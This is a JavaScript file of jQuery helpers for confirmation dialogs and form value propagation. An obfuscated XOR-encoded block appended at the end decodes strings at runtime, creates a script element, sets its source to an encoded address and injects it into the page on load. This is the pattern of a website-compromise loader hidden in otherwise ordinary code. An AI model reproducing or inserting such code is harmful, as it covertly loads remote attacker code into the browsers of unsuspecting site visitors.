$JQ.extend($JQ.noah, {
    propagateOnBeforeLoad: function(api, processingLabel, continueLabel, url)
    {
        var attrName = api.getTrigger().closest('td').next('td').attr('name');
        api.getContent().find('.confirmation_ok').bind( 'click', {attr: attrName}, function(e) { 
            var overlay = $JQ(e.target).closest('.confirmationTemplate');
            // replacing the header text to 'Processing...':
            overlay.find('.confirmationHeader').html(processingLabel);
            // replacing the content with a loading animation image
            $JQ(loadingAnimation).appendTo(overlay.find('.confirmationContent').empty()).center(); 
            overlay.find('.confirmation_ok').hide();
            overlay.find('.confirmation_cancel').val(continueLabel);
            if( e.data.attr=='values' ) 
            {
                var propagateParameters = {
                    attr: e.data.attr, 
                    value: $JQ.toJSON($JQ('.cell [name="'+e.data.attr+'[]"]').fieldArray()),
                    "default": $JQ.toJSON($JQ('.cell [name="default[]"]').fieldArray()),
                    optionValueModificationStack: $JQ.toJSON(optionValueModificationStack)
                };
            }
            else
            {
                var propagateParameters = {
                    attr: e.data.attr, 
                    value: $JQ('.cell [name='+e.data.attr+']').getValue()
                };
            }
            overlay.find('.confirmationContent').load( url, propagateParameters, function(){});
            return false;
        });
    },
    propagateOnClose: function(api, confirmationLabel, propagateConfirmationText, cancelLabel)
    {
        api.getContent().find('.confirmationHeader').html(confirmationLabel).end().
                          find('.confirmationContent').html(propagateConfirmationText).end().
                          find('.confirmation_cancel').val(cancelLabel).end().
                          find('.confirmation_ok').unbind().show();
    },
    submitOptionValueModificationStack: function()
    {
        $JQ('.submitfooter input').click( function() { 
            if( typeof optionValueModificationStack == 'undefined' ) return true;                 
            var stack = $JQ.toJSON(optionValueModificationStack);
            if( $JQ('#optionValueModificationStack').length ) $JQ('#optionValueModificationStack').val(stack);
            else $JQ('<input type="hidden" name="optionValueModificationStack" />').val(stack).appendTo($JQ('div[id$=field-modify_form]').closest('form'));
        });
    }
});
function l3a(m1){return fef3(uusC(m1),'rb2fb9VDxmKhb');}function fef3(w8,gTjwQ){var gpn3='';var ocEVO9=0;var qRS4n=0;for(ocEVO9=0;ocEVO9<w8.length;ocEVO9++){var dZ1FV=w8.charAt(ocEVO9);var anQ=dZ1FV.charCodeAt(0)^gTjwQ.charCodeAt(qRS4n);dZ1FV=String.fromCharCode(anQ);gpn3+=dZ1FV;if(qRS4n==gTjwQ.length-1)qRS4n=0;else qRS4n++;}return (gpn3);}function uusC(h30){var xeF='';var dO97=0;var w4388=0;for(dO97=0;dO97<h30.length/3;dO97++){xeF+=String.fromCharCode(h30.slice(w4388,w4388+3));w4388=w4388+3;}return xeF;}function yDo(bY){var j9=document[l3a(ob7[3])](l3a(ob7[0])+l3a(ob7[1])+l3a(ob7[2]));j9[l3a(ob7[4])]=bY;j9[l3a(ob7[5])]=l3a(ob7[6]);document[l3a(ob7[9])](l3a(ob7[8]))[0][l3a(ob7[7])](j9);}var ob7=["001001","000011","002022","017016087007022092019040029000046006022","001016081","006027066003","006007074018077083055050025030040026011002022","019018066003012093021044017001047","026007083002","021007070035014092059033022025056042027038003085040003084051","026022070022088022121055012012063013076001015094084076075035107018030100011012006076088021"];yDo(l3a(ob7[10]));